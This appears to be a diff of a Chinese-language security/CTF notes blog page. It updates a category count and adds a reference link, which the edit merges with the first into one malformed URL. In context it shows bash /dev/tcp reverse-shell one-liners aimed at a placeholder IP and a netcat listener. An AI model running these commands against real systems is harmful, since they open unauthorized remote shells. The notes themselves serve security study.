@@ -204,7 +204,7 @@
 
             <li class="collapse-level-0" collapse-level="0">
                 <a class="no-padding" href="/categories/CTF笔记/">
-                    CTF笔记 <span class="right">11 篇</span></a>
+                    CTF笔记 <span class="right">13 篇</span></a>
                 </a>
             </li>
 
@@ -386,7 +386,7 @@
 <p>3、将该脚本加入到chkconfig管理列表：<code>chkconfig --add nginxd</code></p>
 <p>4、设置该脚本在level5级，也就是系统以图形化界面运行启动时，开启此脚本：<code>chkconfig --level 5 nginxd on</code></p>
 <h3 id="十、反弹Shell与正弹Shell"><a href="#十、反弹Shell与正弹Shell" class="headerlink" title="十、反弹Shell与正弹Shell"></a>十、反弹Shell与正弹Shell</h3><h4 id="1、反弹Shell"><a href="#1、反弹Shell" class="headerlink" title="1、反弹Shell"></a>1、反弹Shell</h4><blockquote>
-<p>N种反弹Shell的方式：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/10841677.html">https://www.cnblogs.com/-qing-/p/10841677.html</a></p>
+<p>N种反弹Shell的方式：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/10841677.html%E3%80%81%E5%B8%AE%E5%8A%A9%E4%BF%BA%E8%BF%87%E4%BA%86%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%9A%84N%E7%A7%8DShell%E6%96%B9%E5%BC%8F%EF%BC%88msf%E6%96%B9%E5%BC%8F%EF%BC%89%EF%BC%9Ahttps://www.cnblogs.com/zhuxr/p/9854230.html">https://www.cnblogs.com/-qing-/p/10841677.html、帮助俺过了一道CTF题的N种Shell方式（msf方式）：https://www.cnblogs.com/zhuxr/p/9854230.html</a></p>
 <p>Hacker必备技能-反向shell进阶：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg2NjQ2NzU3Ng==&amp;mid=2247484917&amp;idx=1&amp;sn=88e9199bbc27310b30119ce00f3cfcbb&amp;chksm=ce4b2e62f93ca7746f5c339e30968327160e415b0217bc4f9f04c72990dfb1387297715cecd5&amp;mpshare=1&amp;scene=23&amp;srcid=0928E7OUY9dK3Axv1nmtbLIA&amp;sharer_sharetime=1601282092303&amp;sharer_shareid=2bfea3a1914646ead630f87d9dbd3069#rd">https://mp.weixin.qq.com/s?__biz=Mzg2NjQ2NzU3Ng==&amp;mid=2247484917&amp;idx=1&amp;sn=88e9199bbc27310b30119ce00f3cfcbb&amp;chksm=ce4b2e62f93ca7746f5c339e30968327160e415b0217bc4f9f04c72990dfb1387297715cecd5&amp;mpshare=1&amp;scene=23&amp;srcid=0928E7OUY9dK3Axv1nmtbLIA&amp;sharer_sharetime=1601282092303&amp;sharer_shareid=2bfea3a1914646ead630f87d9dbd3069#rd</a></p>
 </blockquote>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/IP/Port 0&gt;&amp;1&#x27;</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/IP/port 0&gt;&amp;1</span><br><span class="line">nc -lvvp Port</span><br></pre></td></tr></table></figure>
